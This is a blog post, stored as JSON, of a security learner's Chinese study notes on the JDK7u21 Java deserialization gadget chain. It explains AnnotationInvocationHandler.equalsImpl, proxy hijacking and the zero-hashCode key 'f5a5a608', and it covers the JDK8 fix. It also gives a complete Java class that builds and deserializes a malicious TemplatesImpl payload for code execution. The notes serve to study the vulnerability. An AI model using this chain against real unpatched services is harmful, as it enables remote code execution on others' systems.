{"title":"Java反序列化8笔记","uid":"4246a945c68e3de6ca09de0bdac9f5e2","slug":"Java反序列化8笔记","date":"2022-09-16T11:41:51.000Z","updated":"2022-09-16T12:27:09.094Z","comments":true,"path":"api/articles/Java反序列化8笔记.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考文章：\"><a href=\"#参考文章：\" class=\"headerlink\" title=\"参考文章：\"></a>参考文章：</h1><p>p牛Java安全漫谈 18</p>\n<p><a href=\"https://t.zsxq.com/06RBYz7un\">https://t.zsxq.com/06RBYz7un</a></p>\n<p>p牛</p>\n<p><a href=\"https://t.zsxq.com/063Zz3B2F\">https://t.zsxq.com/063Zz3B2F</a></p>\n<p>JDK7u21反序列化漏洞分析笔记</p>\n<p><a href=\"https://xz.aliyun.com/t/9704#toc-10\">https://xz.aliyun.com/t/9704#toc-10</a></p>\n<h1 id=\"JDK7u21反序列化利用链：\"><a href=\"#JDK7u21反序列化利用链：\" class=\"headerlink\" title=\"JDK7u21反序列化利用链：\"></a>JDK7u21反序列化利用链：</h1><p>先下载jre7u21</p>\n<p><a href=\"https://www.oracle.com/cn/java/technologies/javase/javase7-archive-downloads.html\">https://www.oracle.com/cn/java/technologies/javase/javase7-archive-downloads.html</a></p>\n<p>不依赖第三方库的反序列化利用链</p>\n<h2 id=\"equalsImpl-：\"><a href=\"#equalsImpl-：\" class=\"headerlink\" title=\"equalsImpl()：\"></a>equalsImpl()：</h2><p>反序列化的核心在于触发动态执行方法的地方</p>\n<p>在jdk7u21的 sun.reflect.annotation.AnnotationInvocationHandler类中有个equalsImpl方法，该方法里有明显的利用反射调用方法并执行</p>\n<p>memberMethod.invoke(o)</p>\n<p>这个memberMethod来自于this.type.getDeclareMethods()</p>\n<p>equalsImpl方法将this.type类中的所有方法遍历执行</p>\n<p>当这个this.type是Templates类时，就会调用newTransformer和getOutputProperties方法，触发任意代码执行</p>\n<p>找半天没找到源码，没办法用idea反编译凑合一下</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/20.PNG\"></p>\n<h2 id=\"调用equalsImpl-：\"><a href=\"#调用equalsImpl-：\" class=\"headerlink\" title=\"调用equalsImpl()：\"></a>调用equalsImpl()：</h2><p>equalsImpl是私有方法，在public方法invoke中被调用</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/21.PNG\"></p>\n<p>漫谈11中提到过，可以通过java.reflect.proxy来劫持一个对象内部的方法调用</p>\n<p> Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},     handler);  </p>\n<p>第一个参数默认，第二个参数是需要代理的对象集合，第三个参数是具体的代理逻辑同时是实现InvocationHandler接口的对象</p>\n<p>同时AnnotationInvocationHandler就是实现了InvocationHandler接口的类，其Invoke方法中，当方法名为equals且参数类型为Object并且长度为1时，就会带调用equalsImpl方法</p>\n<p>equals是比较Java对象时常用的方法，另一个是compareTo</p>\n<p>现在需要找一个使用了equals作为比较方法的类</p>\n<p>在前面的java.util.PriorityQueue有比较的方法，但是它用的compareTo方法</p>\n<p><strong>任意Java对象都拥有 equals 方法，它通常用于比较两个对象是否是同一个引用；而compareTo实际上 是 java.lang.Comparable 接口的方法，我在前一篇介绍 java.util.PriorityQueue 时也介绍过，通 常被实现用于比较两个对象的值是否相等。</strong>  </p>\n<p>这里用到的是hashset，集合set中储存的对象不允许重复，再添加对象时就会进行比较</p>\n<p>在HashSet的readObject方法中，将对象保存在HashMap的key处</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/22.PNG\"></p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/23.PNG\"></p>\n<p>而在HashMap中是通过key.hashcode()去计算获得索引，当碰到相同索引的key-value是，就会被链接到链表后面</p>\n<p>所以，要触发比较就必须让两个需要比较的对象hash相同，是链接到同一张链表才会触发比较</p>\n<p>在HashMap的put方法中</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/24.PNG\"></p>\n<p>只有当两个不同对象的变量4的值，也就是hash相同时就会执行key.quals(k)，这样就会触发前面的equalsImpl，条件满足时就会触发代码执行</p>\n<h3 id=\"哈希计算方法：\"><a href=\"#哈希计算方法：\" class=\"headerlink\" title=\"哈希计算方法：\"></a>哈希计算方法：</h3><p>计算hash的关键代码就是hash方法</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">int hash &#x3D; hash(key); \n\nint i &#x3D; indexFor(hash, table.length);  </code></pre>\n\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/25.PNG\"></p>\n<p>这个this.useAltHashing是在构造函数时获取的</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/26.PNG\"></p>\n<p>会直接返回booted，而这个booted默认情况下是False</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/27.PNG\"></p>\n<p>所以，计算hash主要是通过hashcode</p>\n<p>所以，proxy对象与TemplateImpl对象的哈希是否相等，取决于hashcode()是否相等</p>\n<p>而hashcode()是一个Native方法</p>\n<p>通过proxy.hashCode()会调用到 AnnotationInvocationHandler的invoke方法，进而调用到AnnotationInvocationHandler的hashCodeImpl方法</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/29.PNG\"></p>\n<p>而在hashCodeImpl方法中，会遍历memberValues这个Map中的每个key和value，计算每个(127* key.hashCode())^value.hashCode()并求和</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/30.PNG\"></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">for(Iterator var2 &#x3D; this.memberValues.entrySet().iterator(); var2.hasNext(); var1 +&#x3D; 127 * \t\t\t\t((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;\n\n​         var3 &#x3D; (Map.Entry)var2.next();\n\n​      &#125;</code></pre>\n\n<p>而在jdk7u21中</p>\n<ol>\n<li>当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^ value.hashCode() </li>\n<li>当 key.hashCode() 等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成 value.hashCode() 。 </li>\n<li>当 value 就是TemplateImpl对象时，这两个哈希就变成完全相等  </li>\n</ol>\n<p>所以就要找一个hashCode是0的对象作为memberValues的key，将恶意的TemplteImpl对象作为value，这样计算出的hashCode就会相等</p>\n<h4 id=\"爆破hashCode为0的对象：\"><a href=\"#爆破hashCode为0的对象：\" class=\"headerlink\" title=\"爆破hashCode为0的对象：\"></a>爆破hashCode为0的对象：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">public static void bruteHashCode() &#123; \n\n\tfor (long i &#x3D; 0; i &lt; 9999999999L; i++) &#123; \n\n\t\tif (Long.toHexString(i).hashCode() &#x3D;&#x3D; 0) &#123; \n\n\t\t\tSystem.out.println(Long.toHexString(i)); \n\n\t\t&#125; \n\n\t&#125; \n\n&#125;  </code></pre>\n\n<p>爆破出的第一个是f5a5a608，这是yso中使用的，也可以使用别的</p>\n<h2 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h2><p><strong>这可真是头疼啊！！！！！</strong></p>\n<p>生成恶意TemplateImpl对象</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">TemplatesImpl obj &#x3D; new TemplatesImpl();\n\n​\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\n​\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\n​\t\t&#125;);\n\n​\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\n​\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</code></pre>\n\n<p>实例化AnnotationInvocationHandler对象</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;\n\n​\t        &#x2F;&#x2F; 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值\n\n​\t        HashMap map &#x3D; new HashMap();\n\n​\t        map.put(zeroHashCodeStr, &quot;foo&quot;);\n\n​\t        &#x2F;&#x2F; 实例化AnnotationInvocationHandler类\n\n​\t        Constructor handlerConstructor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);\n\n​\t        handlerConstructor.setAccessible(true);\n\n​\t        InvocationHandler tempHandler &#x3D; (InvocationHandler) \t\t handlerConstructor.newInstance(Templates.class, map);</code></pre>\n\n<p>其属性为TemplateImpl，同时传入key为f5a5a608，value为恶意TemplateImpl对象的map作为memberValues</p>\n<p>对AnnotationInvocationHandler对象做一层代理</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Templates proxy &#x3D; (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</code></pre>\n\n<p>实例化HashSet对象，添加两个元素，分别是proxy和TemplateImpl对象</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">HashSet set &#x3D; new LinkedHashSet();\n\n​\t        set.add(templates);\n\n​\t        set.add(proxy);</code></pre>\n\n<p>之后直接序列化，反序列化，记得要将而已TemplateImpl设置到map中</p>\n<h3 id=\"Test：\"><a href=\"#Test：\" class=\"headerlink\" title=\"Test：\"></a>Test：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.JDK7u21;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.codec.binary.Base64;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.LinkedHashSet;\nimport java.util.Map;\n\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\npublic class Test &#123;\n\t public static void main(String[] args) throws Exception &#123;\n\t        TemplatesImpl templates &#x3D; new TemplatesImpl();\n\t        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t                ClassPool.getDefault().get(com.TemplatesImplTest.HelloTemplatesImplTest.class.getName()).toBytecode()\n\t        &#125;);\n\t        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n\t        String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;\n\n\t        &#x2F;&#x2F; 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值\n\t        HashMap map &#x3D; new HashMap();\n\t        map.put(zeroHashCodeStr, &quot;foo&quot;);\n\n\t        &#x2F;&#x2F; 实例化AnnotationInvocationHandler类\n\t        Constructor handlerConstructor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);\n\t        handlerConstructor.setAccessible(true);\n\t        InvocationHandler tempHandler &#x3D; (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);\n\n\t        &#x2F;&#x2F; 为tempHandler创造一层代理\n\t        Templates proxy &#x3D; (Templates) Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);\n\n\t        &#x2F;&#x2F; 实例化HashSet，并将两个对象放进去\n\t        HashSet set &#x3D; new LinkedHashSet();\n\t        set.add(templates);\n\t        set.add(proxy);\n\n\t        &#x2F;&#x2F; 将恶意templates设置到map中\n\t        map.put(zeroHashCodeStr, templates);\n\n\t        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t        oos.writeObject(set);\n\t        oos.close();\n\n\t        System.out.println(barr);\n\t        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t        Object o &#x3D; (Object)ois.readObject();\n\t    &#125;\n\n\t    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n\t        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t        field.setAccessible(true);\n\t        field.set(obj, value);\n\t    &#125;\n&#125;\n</code></pre>\n\n\n\n<h3 id=\"触发流程：\"><a href=\"#触发流程：\" class=\"headerlink\" title=\"触发流程：\"></a>触发流程：</h3><p>HashSet.readObject </p>\n<p>计算hashCode值</p>\n<p>触发equals方法</p>\n<p>触发equalsImpl方法</p>\n<p>遍历TemplateImpl的方法</p>\n<p>恶意代码执行</p>\n<h3 id=\"JDK8中的修复：\"><a href=\"#JDK8中的修复：\" class=\"headerlink\" title=\"JDK8中的修复：\"></a>JDK8中的修复：</h3><p>这条链在jdk6u45和之前可以使用，6u51时修复，收费了，不管</p>\n<p>jdk8刚出就修复了这个</p>\n<p>在AnnotationInvocationHandler类的readObject方法中对this.type进行了判断，当其部署AnnotationType时会抛出异常，在jdk7u21时，捕获异常后只是将这个函数返回，没有影响整个反序列化的执行过程</p>\n<p>在jdk8中，返回被修改为 throw new java.io.InvalidObjectException(“Non-annotation type in annotation serial stream”);  </p>\n<p>反序列化时会出现异常导致过程停止</p>\n<p>漫谈中提到，看似修复的完美，但是仍然存在问题，导致了后面的一条原生链jdk8u20的产生</p>\n<p><strong>真头疼！！！</strong></p>\n","text":" 参考文章：p牛Java安全漫谈 18 https://t.zsxq.com/06RBYz7un p牛 https://t.zsxq.com/063Zz3B2F JDK7u21反序列化漏洞分析笔记 https://xz.aliyun.com/t/9704#toc-10 JDK7u...","link":"","photos":[],"count_time":{"symbolsCount":"7.8k","symbolsTime":"7 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":13,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A\"><span class=\"toc-text\">参考文章：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9A\"><span class=\"toc-text\">JDK7u21反序列化利用链：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#equalsImpl-%EF%BC%9A\"><span class=\"toc-text\">equalsImpl()：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%B0%83%E7%94%A8equalsImpl-%EF%BC%9A\"><span class=\"toc-text\">调用equalsImpl()：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%93%88%E5%B8%8C%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">哈希计算方法：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%88%86%E7%A0%B4hashCode%E4%B8%BA0%E7%9A%84%E5%AF%B9%E8%B1%A1%EF%BC%9A\"><span class=\"toc-text\">爆破hashCode为0的对象：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">小结：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Test%EF%BC%9A\"><span class=\"toc-text\">Test：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%EF%BC%9A\"><span class=\"toc-text\">触发流程：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JDK8%E4%B8%AD%E7%9A%84%E4%BF%AE%E5%A4%8D%EF%BC%9A\"><span class=\"toc-text\">JDK8中的修复：</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反序列化9笔记","uid":"fc0657b8e278d4cdd3f372956d7c0f2c","slug":"Java反序列化9笔记","date":"2022-09-16T11:41:59.000Z","updated":"2022-09-16T12:33:28.078Z","comments":true,"path":"api/articles/Java反序列化9笔记.json","keywords":null,"cover":[],"text":" 参考文章：p牛 Java安全漫谈19 https://t.zsxq.com/06mmMZrFu Object Serialization Stream Protocol https://docs.oracle.com/javase/8/docs/platform/seriali...","link":"","photos":[],"count_time":{"symbolsCount":"6.5k","symbolsTime":"6 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":13,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化7笔记","uid":"12aa89fe66392175592eb0eacb1d89b4","slug":"Java反序列化7笔记","date":"2022-09-16T11:41:44.000Z","updated":"2022-09-16T12:15:51.820Z","comments":true,"path":"api/articles/Java反序列化7笔记.json","keywords":null,"cover":[],"text":" 参考资料：p牛 Java安全漫谈17 https://t.zsxq.com/067qjIa6Y 廖雪峰老师的JavaBean教程： https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680 Common...","link":"","photos":[],"count_time":{"symbolsCount":"9.2k","symbolsTime":"8 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":13,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}